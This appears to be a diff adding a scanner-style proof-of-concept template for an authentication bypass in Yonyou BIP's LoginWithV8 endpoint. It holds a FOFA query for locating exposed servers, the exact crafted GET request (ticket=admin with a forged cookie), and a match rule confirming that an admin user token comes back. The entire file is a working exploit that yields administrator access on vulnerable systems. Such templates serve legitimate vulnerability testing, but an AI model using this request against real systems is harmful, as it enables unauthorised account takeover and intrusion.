@@ -1,0 +1,20 @@
+id: poc-yaml-yongyou-bip-loginwithv8-login-bypass
+info:
+  name: 用友BIP LoginWithV8 登录绕过漏洞
+  severity: high
+  tags:
+  - 认证绕过
+  finger: 用友BIP
+  fofa: body="/bi/portal/manifest.json" || body="js/lib/ba.common.js" && body="用友"
+requests:
+- method: GET
+  path: /bi/api/Portal/LoginWithV8/?ticket=admin
+  headers:
+    Cookie: _WorkbenchCross_=Ultraman
+  expression: "status_code == 200 && \n(\ncontains(body,\"\\\"UserCode\\\":\\\"admin\\\
+    \"\") ||\ncontains(body,\"<UserCode>admin</UserCode>\")\n) &&\n(\ncontains(body,\"\
+    \\\"UserToken\\\":\") ||\ncontains(body,\"<UserToken>\")\n) &&\nmatches(body,\"\
+    [0-9a-fA-F]{8}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-[0-9a-fA-F]{12}\"\
+    )\n"
+variables: {}
+transport: http
